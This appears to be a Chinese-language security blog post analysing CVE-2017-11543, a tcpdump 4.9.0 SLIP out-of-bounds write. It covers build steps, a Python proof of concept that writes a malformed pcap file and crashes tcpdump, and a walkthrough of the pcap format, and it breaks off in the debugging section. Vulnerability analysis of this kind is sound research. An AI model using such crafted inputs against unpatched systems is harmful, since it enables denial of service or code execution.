<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>CVE-2017-11543 Analysis - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="最近觉得打比赛打多了，想分析一些实际的漏洞，于是挑了一个易上手的和 tcpdump 有关的 CVE-2017-11543 来分析，参考资料都放在最后了。
" />
<meta name="keywords" content="CVE-2017-11543, tcpdump" />







<meta name="generator" content="Hugo 0.55.2" />


<link rel="canonical" href="https://bash-c.github.io/post/cve-2017-11543-analysis/" />



<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.19ae5a432863a072ec64433bb1020bd6d3401129f87d6f2ad5af3bcfd84168a1.css" integrity="sha256-Ga5aQyhjoHLsZEM7sQIL1tNAESn4fW8q1a87z9hBaKE=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="CVE-2017-11543 Analysis" />
<meta property="og:description" content="最近觉得打比赛打多了，想分析一些实际的漏洞，于是挑了一个易上手的和 tcpdump 有关的 CVE-2017-11543 来分析，参考资料都放在最后了。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/cve-2017-11543-analysis/" />
<meta property="article:published_time" content="2018-09-24T22:23:06&#43;08:00"/>
<meta property="article:modified_time" content="2018-09-24T22:23:06&#43;08:00"/>

<meta itemprop="name" content="CVE-2017-11543 Analysis">
<meta itemprop="description" content="最近觉得打比赛打多了，想分析一些实际的漏洞，于是挑了一个易上手的和 tcpdump 有关的 CVE-2017-11543 来分析，参考资料都放在最后了。">


<meta itemprop="datePublished" content="2018-09-24T22:23:06&#43;08:00" />
<meta itemprop="dateModified" content="2018-09-24T22:23:06&#43;08:00" />
<meta itemprop="wordCount" content="4670">



<meta itemprop="keywords" content="CVE," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2017-11543 Analysis"/>
<meta name="twitter:description" content="最近觉得打比赛打多了，想分析一些实际的漏洞，于是挑了一个易上手的和 tcpdump 有关的 CVE-2017-11543 来分析，参考资料都放在最后了。"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo"># </a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      # 
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    
    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">CVE-2017-11543 Analysis</h1>
      
      <div class="post-meta">
        <time datetime="2018-09-24" class="post-time">
          2018-09-24
        </time>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
            
          </div>
        <span class="more-meta"> 4670 words </span>
          <span class="more-meta"> 10 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#background">Background</a></li>
<li><a href="#漏洞复现">漏洞复现</a>
<ul>
<li><a href="#install-tcpdump-4-9-0">install tcpdump==4.9.0</a></li>
<li><a href="#segment-fault">Segment Fault</a></li>
</ul></li>
<li><a href="#漏洞分析">漏洞分析</a>
<ul>
<li><a href="#pcap-文件格式">pcap 文件格式</a>
<ul>
<li><a href="#global-header">global header</a></li>
<li><a href="#record-packet-header">Record (Packet) Header</a></li>
<li><a href="#packet-data">Packet Data</a></li>
</ul></li>
<li><a href="#代码定位">代码定位</a></li>
</ul></li>
<li><a href="#漏洞修复">漏洞修复</a></li>
<li><a href="#pwn-掉-tcpdump">pwn 掉 tcpdump？</a></li>
<li><a href="#reference-and-thanks-to">Reference and thanks to</a></li>
</ul></li>
</ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <p>最近觉得打比赛打多了，想分析一些实际的漏洞，于是挑了一个易上手的和 <code>tcpdump</code> 有关的 <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11543">CVE-2017-11543</a> 来分析，参考资料都放在最后了。</p>

<h2 id="overview">Overview</h2>

<table>
<thead>
<tr>
<th>漏洞软件</th>
<th>tcpdump</th>
<th>版本：4.9.0</th>
</tr>
</thead>

<tbody>
</tbody>
</table>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></pre></td>
<td class="lntd">
<pre class="chroma">- CVE-2017-11543 (arbitrary code execution)

An out-of-bounds write vulnerability was discovered in tcpdump&#39;s
handling of LINKTYPE_SLIP in the sliplink_print function in print-sl.c.
An attacker could craft a malicious pcap file or send specially crafted
packets to the network that would cause tcpdump to crash or possibly
execute arbitrary code when attempting to print a summary of the packet
data.</pre></td></tr></table>
</div>
</div>
<p>这是一个在 <code>4.9.0</code> 版本的 <code>tcpdump</code> 中出现的栈溢出漏洞，漏洞出现在 <code>sliplink_print()</code> 函数(<code>print-sl.c</code>)中，效果是可以造成 <code>crash</code> 或者 <code>arbitrary code execution</code>。</p>

<p>这个漏洞是通过 <a href="lcamtuf.coredump.cx/afl/">AFL</a> 发现的。</p>

<h2 id="background">Background</h2>

<p><code>tcpdump</code> 是一个运行在 <a href="http://m4x.fun/post/play_with_file_descriptor_1/#什么是-cli">CLI</a> 下的嗅探工具，它允许用户拦截和显示发送或收到过网络连接到该计算机的 <em>TCP/IP</em> 和其他数据包。用户必须拥有 <strong>超级用户权限</strong> 方可使用 <code>tcpdump</code>。和 <a href="https://www.wireshark.org">wireshark</a> 的语法相同，在服务器端多使用 tcpdump，在客户端多使用 wireshark。</p>

<p>其基本用法有:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">~ tldr tcpdump

  tcpdump

  Dump traffic on a network.

  - List available network interfaces:
    tcpdump -D

  - Capture the traffic of a specific interface:
    tcpdump -i eth0

  - Capture all TCP traffic showing contents <span class="o">(</span>ASCII<span class="o">)</span> in console:
    tcpdump -A tcp

  - Capture the traffic from or to a host:
    tcpdump host www.example.com

  - Capture the traffic from a specific interface, source, destination and destination port:
    tcpdump -i eth0 src <span class="m">192</span>.168.1.1 and dst <span class="m">192</span>.168.1.2 and dst port <span class="m">80</span>

  - Capture the traffic of a network:
    tcpdump net <span class="m">192</span>.168.1.0/24

  - Capture all traffic except traffic over port <span class="m">22</span> and save to a dump file:
    tcpdump -w dumpfile.pcap not port <span class="m">22</span>

  - Read from a given dump file:
    tcpdump -r dumpfile.pcap</code></pre></td></tr></table>
</div>
</div>
<h2 id="漏洞复现">漏洞复现</h2>

<table>
<thead>
<tr>
<th>环境</th>
<th>docker</th>
<th>ubuntu:16.04</th>
</tr>
</thead>

<tbody>
<tr>
<td>编辑器</td>
<td>vim</td>
<td>ctags</td>
</tr>
</tbody>
</table>

<blockquote>
<p>主要参考了 <a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/7.1.1_tcpdump_2017-11543.md">CTF-all-in-one</a>，细节部分做了一些优化。</p>
</blockquote>

<h3 id="install-tcpdump-4-9-0">install tcpdump==4.9.0</h3>

<p>首先安装 dev 版本的 libpcap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># apt-get update</span>
<span class="c1"># apt-get install libpcap-dev</span>
<span class="c1"># dpkg -l libpcap-dev</span>

root@7fe409e06b06:~# dpkg -l libpcap-dev
<span class="nv">Desired</span><span class="o">=</span>Unknown/Install/Remove/Purge/Hold
<span class="p">|</span> <span class="nv">Status</span><span class="o">=</span>Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
<span class="p">|</span>/ Err?<span class="o">=(</span>none<span class="o">)</span>/Reinst-required <span class="o">(</span>Status,Err: <span class="nv">uppercase</span><span class="o">=</span>bad<span class="o">)</span>
<span class="o">||</span>/ Name           Version      Architecture Description
+++-<span class="o">==============</span>-<span class="o">============</span>-<span class="o">============</span>-<span class="o">=================================</span>
ii  libpcap-dev    <span class="m">1</span>.7.4-2      all          development library <span class="k">for</span> libpcap <span class="o">(</span></code></pre></td></tr></table>
</div>
</div>
<p>编译 tcpdump(v 4.9.0)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># apt-get install wget gcc make vim python gdb git sudo</span>
<span class="c1"># wget https://github.com/the-tcpdump-group/tcpdump/archive/tcpdump-4.9.0.tar.gz</span>
<span class="c1"># tar xzf ./tcpdump-4.9.0.tar.gz</span> 
<span class="c1"># ./configure</span></code></pre></td></tr></table>
</div>
</div>
<p>执行 <code>configure</code> 会生成 <code>Makefile</code>。
为了后边调试的方便，修改一下 Makefile，CFLAGS 改为 <code>-g -O0 -no-pie</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">CFLAGS</span> <span class="o">=</span> -g -O0 -no-pie</code></pre></td></tr></table>
</div>
</div>
<p>然后 <code>make</code> 即可在源码目录下生成二进制文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># make</span>

root@7fe409e06b06:~/tcpdump-tcpdump-4.9.0# ./tcpdump --version
tcpdump version <span class="m">4</span>.9.0
libpcap version <span class="m">1</span>.7.4</code></pre></td></tr></table>
</div>
</div>
<h3 id="segment-fault">Segment Fault</h3>

<p>使用如下的 poc 即可出发漏洞产生 Segment Fault</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">root@7fe409e06b06:~# cat poc.py 
import os

def sigsegv<span class="o">()</span>:
    <span class="nv">buf</span>  <span class="o">=</span> <span class="s2">&#34;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00&#34;</span>
    <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\x00\x00\x04\x00\x08\x00\x00\x00\xf6\xb5\xa5X\xf8\xbd\x07\x00&#39;&#34;</span>
    <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\x00\x00\x006\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7&#34;</span>
    <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xca\x00&#34;</span>
    <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\x00RT\x00\x125\x02\x08\x00&#39;\xbd\xc8.\x08\x00&#34;</span>

    with open<span class="o">(</span><span class="s2">&#34;slip-bad-direction.pcap&#34;</span>, <span class="s2">&#34;wb&#34;</span><span class="o">)</span> as f:
        f.write<span class="o">(</span>buf<span class="o">)</span>

    <span class="nv">cmd</span> <span class="o">=</span> <span class="s1">&#39;./tcpdump-tcpdump-4.9.0/tcpdump -e -r ./slip-bad-direction.pcap&#39;</span>
    os.system<span class="o">(</span>cmd<span class="o">)</span>

<span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span>:
    sigsegv<span class="o">()</span>
root@7fe409e06b06:~# python poc.py 
reading from file ./slip-bad-direction.pcap, link-type SLIP <span class="o">(</span>SLIP<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>

root@7fe409e06b06:~# file slip-bad-direction.pcap 
slip-bad-direction.pcap: tcpdump capture file <span class="o">(</span>little-endian<span class="o">)</span> - version <span class="m">2</span>.4 <span class="o">(</span>SLIP, capture length <span class="m">262144</span><span class="o">)</span></code></pre></td></tr></table>
</div>
</div>
<p>如此便触发了栈溢出漏洞引发了 crash。</p>

<blockquote>
<p>或者可以按照 CTF-all-in-one 的做法，修改 Makefile，gcc 的参数添加 <code>-fsanitize=address</code>，以开启内存检测功能。</p>

<p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">Address Sanitizer</a> 是自 gcc 4.8 以后添加的一个检测内存访问错误的工具，由 google 开发。</p>
</blockquote>

<h2 id="漏洞分析">漏洞分析</h2>

<h3 id="pcap-文件格式">pcap 文件格式</h3>

<p>首先我们需要对 pcap 的文件格式有一个了解。</p>

<blockquote>
<p>主要参考了 <a href="https://www.zybuluo.com/natsumi/note/80231">https://www.zybuluo.com/natsumi/note/80231</a></p>
</blockquote>

<p>总体结构是 <code>global header</code> 后跟着几条捕获数据包的记录:</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvl2i61v5sj30mt01cq2s.jpg" alt="" /></p>

<h4 id="global-header">global header</h4>

<p>其中 global header 的结构具体如下(<a href="https://github.com/kynesim/tstools/blob/db1f79f409818fa0476ecf8593079a7ca3dbafd2/pcap.h#L53-L86">Source Code</a>)，共 24 个字节。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">pcap_hdr_s</span>
<span class="p">{</span>
  <span class="cm">/*! Magic number - 0xa1b2c3d4 means no swap needed,
</span><span class="cm">   *  0xd4c3b2a1 means we&#39;ll need to swap.
</span><span class="cm">   */</span>
  <span class="n">uint32_t</span> <span class="n">magic_number</span><span class="p">;</span>

  <span class="cm">/*! Major version number (currently 2) */</span>
  <span class="n">uint16_t</span> <span class="n">version_major</span><span class="p">;</span>

  <span class="cm">/*! Minor version number (4 + ) */</span>
  <span class="n">uint16_t</span> <span class="n">version_minor</span><span class="p">;</span>

  <span class="cm">/*! GMT to local-time correction, in s */</span>
  <span class="n">int32_t</span> <span class="n">thiszone</span><span class="p">;</span>

  <span class="cm">/*! Accuracy of timestamps. In practice, always 0 */</span>
  <span class="n">uint32_t</span> <span class="n">sigfigs</span><span class="p">;</span>

  <span class="cm">/*! Snapshot length (typically 65535 + but might be limited) */</span>
  <span class="n">uint32_t</span> <span class="n">snaplen</span><span class="p">;</span>


  <span class="cm">/* These are network types - equivalent to WTAP_ENCAP_XXX in
</span><span class="cm">   *  libpcap.c  . We only care about a few ..
</span><span class="cm">   */</span>

<span class="cp">#define PCAP_NETWORK_TYPE_NONE 0
</span><span class="cp">#define PCAP_NETWORK_TYPE_ETHERNET 1
</span><span class="cp"></span>
  <span class="cm">/*! Network type: Ethernet = 1 .. */</span>
  <span class="n">uint32_t</span> <span class="n">network</span><span class="p">;</span>

<span class="p">}</span> <span class="n">pcap_hdr_t</span><span class="p">;</span></code></pre></td></tr></table>
</div>
</div>
<p><strong>magic_number:</strong></p>

<p>4 bytes，用来识别文件格式本身和字节顺序。分三种情况：</p>

<ol>
<li><strong>0xa1b2c3d4</strong>: 按照程序字节序的方式写入。</li>
<li><strong>0xd4c3b2a1</strong>: 表示后边所有的字段都要进行字节序反转。</li>
<li><strong>0xa1b23c4d</strong>: 文件为纳秒精度。</li>
</ol>

<p><strong>version_major, version_minor:</strong></p>

<p>各 2 bytes，文件格式的版本号，目前最新的版本为 2.4。</p>

<p>即常见的 pcap 包中，version_major 为 0x0002，version_minor 为 0x0004。</p>

<p><strong>thiszone :</strong></p>

<p>4 bytes，GMT (UTC) 和后面 packet header 的时间戳所用的时区的时间差（单位：秒）。 实际上，时间戳用的一般都是 GMT 时间, 所以 <strong>thiszone 一般都设为 0</strong>。</p>

<p><strong>sigfigs :</strong></p>

<p>4 bytes，时间戳的精度, <strong>一般也设置为0</strong>。</p>

<p><strong>snaplen :</strong></p>

<p>4 bytes，每个数据包的最大存储长度（该值设置所抓获的数据包的最大长度，如果所有数据包都要抓获，将该值设置为 65535； 例如想获取数据包的前 64 字节，可将该值设置为 64）</p>

<p><strong>network :</strong></p>

<p>4 bytes，链路类型，例如为 1 时代表为以太网，8 时代表为 SLIP，完整的对应关系 <a href="http://www.tcpdump.org/linktypes.html">戳这</a></p>

<hr />

<p>我们看一下生成 pcap 的 global_header，这里用的是 <a href="https://www.sweetscape.com/010editor/">010editor</a> 的 pcap template。</p>

<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
<th>Start</th>
<th>Size</th>
</tr>
</thead>

<tbody>
<tr>
<td>struct PCAPHEADER header</td>
<td></td>
<td>0h</td>
<td>18h</td>
</tr>

<tr>
<td>uint32 magic_number</td>
<td>A1B2C3D4h</td>
<td>0h</td>
<td>4h</td>
</tr>

<tr>
<td>uint16 version_major</td>
<td>2</td>
<td>4h</td>
<td>2h</td>
</tr>

<tr>
<td>uint16 version_minor</td>
<td>4</td>
<td>6h</td>
<td>2h</td>
</tr>

<tr>
<td>int32 thiszone</td>
<td>0</td>
<td>8h</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 sigfigs</td>
<td>0</td>
<td>Ch</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 snaplen</td>
<td>40000h</td>
<td>10h</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 network</td>
<td>8</td>
<td>14h</td>
<td>4h</td>
</tr>
</tbody>
</table>

<p>其中 <strong>network == 8</strong>，即链路类型为 SLIP，</p>

<h4 id="record-packet-header">Record (Packet) Header</h4>

<p>Packet Header 的源码如下(<a href="https://github.com/kynesim/tstools/blob/db1f79f409818fa0476ecf8593079a7ca3dbafd2/pcap.h#L92-L106">Source Code</a>)，共 16 个字节。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">pcaprec_hdr_s</span>
<span class="p">{</span>
  <span class="cm">/*! Timestamp seconds */</span>
  <span class="n">uint32_t</span> <span class="n">ts_sec</span><span class="p">;</span>

  <span class="cm">/*! Timetamp uS */</span>
  <span class="n">uint32_t</span> <span class="n">ts_usec</span><span class="p">;</span>

  <span class="cm">/*! Number of octets saved after the header */</span>
  <span class="n">uint32_t</span> <span class="n">incl_len</span><span class="p">;</span>

  <span class="cm">/*! Original packet length */</span>
  <span class="n">uint32_t</span> <span class="n">orig_len</span><span class="p">;</span>

<span class="p">}</span> <span class="n">pcaprec_hdr_t</span><span class="p">;</span></code></pre></td></tr></table>
</div>
</div>
<p><strong>ts_sec :</strong></p>

<p>4 bytes，时间戳高位，精确到 seconds（值是自从 January 1, 1970 00:00:00 GMT以来的秒数来记），其实就是 *nix 的time_t，可以用 ANSI C time.h 中的 time() 函数来获取这个值。如果时间戳不是基于 GMT 的，需调整 global header 中的 thiszone</p>

<p><strong>ts_usec :</strong></p>

<p>4 bytes，时间戳低位。一般的 pcap 文件中，精确到 microseconds（数据包被捕获时候的微秒数，是自 ts-sec 的偏移量）
在纳秒精度的文件中，这个字段是数据包被捕获时候的纳秒数
注意：这个字段的值不能大于 1 秒</p>

<p><strong>incl_len :</strong></p>

<p>4 bytes，捕获且存储在 PCAP 文件中的数据包长度
其实就是 min[orig_len, snaplen]</p>

<p><strong>orig_len :</strong></p>

<p>4 bytes，这个数据包在网络中的原始长度。</p>

<hr />

<p>poc 中对应的数据为</p>

<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
<th>Start</th>
<th>Size</th>
</tr>
</thead>

<tbody>
<tr>
<td>time_t ts_sec</td>
<td>02/16/2017 14:23:50</td>
<td>18h</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 ts_usec</td>
<td>7BDF8h</td>
<td>1Ch</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 incl_len</td>
<td>27h</td>
<td>20h</td>
<td>4h</td>
</tr>

<tr>
<td>uint32 orig_len</td>
<td>E7E7E736h</td>
<td>24h</td>
<td>4h</td>
</tr>
</tbody>
</table>

<h4 id="packet-data">Packet Data</h4>

<p>Packet(链路层的数据帧) 的具体内容，其长度即为 incl_len。</p>

<p>链路层类型为 <code>08</code>，即 SLIP。SLIP 包的结构如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></pre></td>
<td class="lntd">
<pre class="chroma">+-------------------------+
|        Direction        |
|        (1 Octet)        |
+-------------------------+
|       Packet type       |
|        (1 Octet)        |
+-------------------------+
| Compression information |
|       (14 Octets)       |
+-------------------------+
|         Payload         |
.                         .
.                         .
.                         .</pre></td></tr></table>
</div>
</div>
<p>则在此 poc 中，direction 即为 0xe7</p>

<h3 id="代码定位">代码定位</h3>

<p>直接上 gdb，编译时加了 <code>-g</code> 参数，很容易就能定位到 crash 的源代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
